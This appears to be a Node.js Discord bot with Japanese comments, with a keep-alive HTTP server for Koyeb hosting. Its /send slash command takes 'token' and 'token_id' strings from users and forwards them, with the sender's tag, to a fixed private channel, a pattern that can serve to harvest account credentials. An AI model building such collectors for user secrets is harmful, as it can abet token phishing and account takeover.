// ===============================
// HTTP サーバー（Koyeb 用）
// ===============================
const http = require("http");
const PORT = process.env.PORT || 3000;

http.createServer((req, res) => {
  res.end("OK");
}).listen(PORT, () => {
  console.log(`HTTP server listening on port ${PORT}`);
});

// ===============================
// Discord Bot
// ===============================
const { Client, GatewayIntentBits, Partials } = require("discord.js");

// 送信先チャンネルID（ここに実際のIDを入れてね）
const TARGET_CHANNEL_ID = "123456789012345678";

// トークンが設定されていない場合は即終了
if (!process.env.TOKEN) {
  console.error("❌ ERROR: TOKEN が設定されていません（process.env.TOKEN が undefined）");
  process.exit(1);
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages
  ],
  partials: [Partials.Channel, Partials.Message]
});

client.on("ready", () => {
  console.log(`ログイン完了: ${client.user.tag}`);
});

// ===============================
// スラッシュコマンド処理（/send）
// ===============================
client.on("interactionCreate", async interaction => {
  if (!interaction.isChatInputCommand()) return;
  if (interaction.commandName !== "send") return;

  const token = interaction.options.getString("token");
  const tokenId = interaction.options.getString("token_id");
  const sender = `${interaction.user.tag}`;

  const channel = await client.channels.fetch(TARGET_CHANNEL_ID);
  await channel.send(`TOKEN: ${token}\nTOKEN_ID: ${tokenId}\nfrom ${sender}`);

  await interaction.reply({ content: "送信しました！", ephemeral: true });
});

// ===============================
// Discord ログイン
// ===============================
client.login(process.env.TOKEN).catch(err => {
  console.error("❌ Discord ログインエラー:", err);
  process.exit(1);
});